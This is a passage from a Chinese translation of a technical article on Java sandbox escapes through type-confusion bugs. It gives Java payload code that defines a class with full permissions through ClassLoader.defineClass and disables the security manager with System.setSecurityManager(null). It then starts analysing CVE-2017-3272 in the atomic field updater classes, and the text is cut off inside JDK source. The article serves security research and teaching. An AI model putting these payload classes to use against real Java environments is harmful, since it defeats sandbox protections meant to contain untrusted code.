原文：
在上一篇中，我们不仅回顾了Java沙箱的漏洞简史，介绍了Java平台的两个基本组成部分，同时，还讲解了Java安全管理器和doPrivileged方法。在本文中，我们将为读者介绍基于类型混淆漏洞的沙箱逃逸技术。
**\--[ 3 - 内存破坏漏洞**
* * *
**\----[ 3.1 - 类型混淆漏洞**
* * *
**\------[ 3.1.1 -背景知识**
* * *
在这里，我们介绍的第一种内存破坏漏洞为类型混淆漏洞[13]。实际上，许多Java漏洞都是依赖于类型混淆漏洞来实现沙箱逃避的，如[16]、[17]以及最近的[18]。简而言之，当存在类型混淆时，VM就会认为对象的类型为
_A_ ，而实际上对象的类型为 _B_ 。那么，我们如何通过类型混淆漏洞来禁用安全管理器呢？
答案是，安全分析人员可以借助类型混淆漏洞来访问那些本来无权访问的方法。对于安全分析人员来说，典型的目标就是_ClassLoader_类的defineClass()方法。为什么呢？
好吧，这种方法允许安全分析人员定义一个自定义的类（这样，就有可能控制它了），并赋予却完整的权限。因此，安全分析人员可以创建并执行自己新定义的类，并让这个类包含禁用安全管理器的代码，从而绕过所有的授权检查。
其中，方法defineClass()的访问权限为“protected”，因此，只能由类_ClassLoader_中的方法或_ClassLoader_的子类调用。由于安全分析人员无法修改_ClassLoader_中的方法，因此，唯一的选择就是利用_ClassLoader_的子类来调用defineClass()方法。但是，直接从没有相应权限的代码来实例化_ClassLoader_的子类的话，会触发安全异常，因为_ClassLoader_的构造函数会检查“Create_ClassLoader”权限。这里的窍门是，定义一个继承_ClassLoader_的子类，例如下面的_Help_类，并添加一个静态方法，并以_Help_类型的对象作为其参数。
然后，安全分析人员可以从环境中检索现有的_ClassLoader_实例，并利用类型混淆漏洞将其“强制转换”为 _Help_
。这样一来，JVM将会把方法doWork()（下面的第4行）的参数h看作是_ClassLoader_的子类（而它的实际类型是 _ClassLoader_
），这样，安全分析人员就可以访问protected方法defineClass()了（对于Java语言来说，protected方法可以从子类中进行访问）。
    1: public class Help extends ClassLoader implements
      2:    Serializable {
      3:
      4:   public static void doWork(Help h) throws Throwable {
      5:
      6:     byte[] buffer = BypassExploit.getDefaultHelper();
      7:     URL url = new URL("file:///");
      8:     Certificate[] certs = new Certificate[0];
      9:     Permissions perm = new Permissions();
     10:     perm.add(new AllPermission());
     11:     ProtectionDomain protectionDomain = new ProtectionDomain(
     12:      new CodeSource(url, certs), perm);
     13:
     14:     Class cls = h.defineClass("DefaultHelper", buffer, 0,
     15:      buffer.length, protectionDomain);
     16:     cls.newInstance();
     17:
     18:   }
     19: }
更准确地说，安全分析人员要想借助类型混淆漏洞来禁用沙箱的话，可以分三步走。首先，安全分析人员可以按如下方式检索应用程序的类加载器（这一步没有权限要求）：
    Object cl = Help.class.getClassLoader();
然后，利用类型混淆漏洞，可以让VM将对象cl的类型视为 _Help_ 。
    Help h = use_type_confusion_to_convert_to_Help(cl);
最后，将h作为参数提交给_Help_类的静态方法doWork()，从而禁用安全管理器。
doWork()方法首先会加载（但不执行）缓冲区中处于安全分析人员控制之下的_DefaultHelper_类的字节码（见上面代码清单中的第6行）。就像下面所示的那样，这个类将通过其构造函数中的doPrivileged()方法来禁用安全管理器。注意，这个doPrivileged()是必不可少的，主要用于防止检查整个调用堆栈的权限，因为main()也属于调用序列的一部分，并且它没有相应的权限。
    1: public class DefaultHelper implements PrivilegedExceptionAction {
    2:   public DefaultHelper() {
    3:       AccessController.doPrivileged(this);
    4:   }
    5:
    6:   public Void run() throws Exception {
    7:     System.setSecurityManager(null);
    8:   }
    9: }
加载字节码后，它会创建一个具有全部权限的保护域（protection
domain），见第7-12行。最后，它调用h的defineClass()方法，具体见第14-15行。这里的调用是合法的，因为在VM看来，h的类型为
_Help_ 。但是，h的实际类型为 _ClassLoader_
。不过，在类_ClassLoader_中，由于defineClass()被定义为protected方法，因此，所以调用是成功的。至此，安全分析人员已经为自己的类加载了全部的权限。最后一步(第16行)是实例化相应的类，以触发对run()方法的调用，该方法将禁用安全管理器。禁用安全管理器后，安全分析人员可以执行任意Java代码，就好像它拥有所有权限一样。
**\------[ 3.1.2 –示例： CVE-2017-3272**
* * *
前面解释了类型混淆漏洞的概念，以及利用它来禁用安全管理器的方法。下面，我们将提供了一个示例，来演示如何使用CVE-2017-3272漏洞来实现这类攻击。
Redhat公司的bugzilla在文献[14]中提供了有关CVE-2017-3272的技术细节，以下文字就是摘自该文献：
“研究发现，OpenJDK的Libraries组件中的_java.util.concurrent.atomic_包中的原子字段更新器没有正确地限制对protected字段成员的访问。恶意的Java应用程序或applet代码能够利用该漏洞绕过Java沙箱的限制”。
这表明漏洞代码位于_java.util.concurrent.atomic.package_中，这与访问protected字段有关。该页面还提供了OpenJDK的补丁程序“8165344:
Update concurrency support”的链接。这个补丁程序会修改 _AtomicIntegerFieldUpdater_ 、_
_AtomicLongFieldUpdater_和_AtomicReferenceFieldUpdater_类。那么，这些类的作用是什么呢？
为了实现字段的并发修改，Java提供了 _AtomicLong_
、_AtomicInt_和_AtomicBoolean_等类。例如，为了生成一千万个可并发修改的_long_字段，必须实例化一千万个_AtomicLong_对象。由于_AtomicLong_类的单个实例需要24个字节+4个字节=28个字节的内存来引用实例[15]，因此有一千万个_AtomicLong_类的实例，就需要使用267Mib字节内存空间。
相比之下，使用_AtomicLongFieldUpdater_类的话，它只需要10.000.000 * 8 = 76
MiB字节空间。实际上，只有Long类型的字段才会占用大量空间。
此外，由于_Atomic _FieldUpdater_类中的所有方法都是静态的，因此，只会为更新器生成单个实例。使用_Atomic_
FieldUpdater_类的另一个好处是，垃圾收集器不必跟踪一千万个_AtomicLong_对象。但是，这样做的代价是，更新器需要使用Java的不安全功能，通过_sun.misc.Unsafe_类来检索目标字段的内存地址。
关于创建_AtomicReferenceFieldUpdater_实例的过程，具体如下所示。调用方法newUpdater()时，必须提供3个参数：tclass，包含字段的类的类型；vclass，该字段的类型；fieldName，字段的名称。
    1: public static  AtomicReferenceFieldUpdater newUpdater(
      2:                                 Class tclass,
      3:                                 Class vclass,
      4:                                 String fieldName) {
      5:   return new AtomicReferenceFieldUpdaterImpl
      6:     (tclass, vclass, fieldName, Reflection.getCallerClass());
      7: }
方法newUpdater()调用_AtomicReferenceFieldUpdaterImpl_类的构造函数来完成实际的工作。
    1: AtomicReferenceFieldUpdaterImpl(final Class tclass,
      2:                                 final Class vclass,
      3:                                 final String fieldName,
      4:                                 final Class caller) {
      5:   final Field field;
      6:   final Class fieldClass;
      7:   final int modifiers;
      8:   try {
      9:     field = AccessController.doPrivileged(
     10:       new PrivilegedExceptionAction() {
     11:         public Field run() throws NoSuchFieldException {
     12:           return tclass.getDeclaredField(fieldName);
     13:         }
     14:       });
     15:     modifiers = field.getModifiers();
     16:     sun.reflect.misc.ReflectUtil.ensureMemberAccess(
     17:       caller, tclass, null, modifiers);
     18:     ClassLoader cl = tclass.getClassLoader();
     19:     ClassLoader ccl = caller.getClassLoader();
     20:     if ((ccl != null) && (ccl != cl) &&
     21:       ((cl == null) || !isAncestor(cl, ccl))) {
     22:       sun.reflect.misc.ReflectUtil.checkPackageAccess(tclass);
     23:     }
     24:     fieldClass = field.getType();
     25:   } catch (PrivilegedActionException pae) {
     26:     throw new RuntimeException(pae.getException());
     27:   } catch (Exception ex) {
     28:     throw new RuntimeException(ex);